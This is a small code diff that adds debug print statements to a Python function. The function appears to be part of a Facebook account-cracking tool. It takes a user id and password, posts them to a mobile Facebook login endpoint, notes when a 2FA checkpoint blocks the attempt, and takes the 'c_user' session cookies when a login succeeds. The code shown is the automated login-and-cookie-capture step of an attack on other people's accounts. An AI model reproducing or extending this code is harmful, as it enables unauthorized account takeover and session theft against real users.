@@ -1783,7 +1783,10 @@ def d(uid,pwx,tl):
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=e83b925010f428c02e9a28277ebe1ac259315059ef636d91d59afb3de1f921fa"
             po = Session.post(url, data=data2, headers=headers).text
+            print(po)
+            print(f"--------------------------------")
             response = Session.cookies.get_dict().keys()
+            print(response)
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
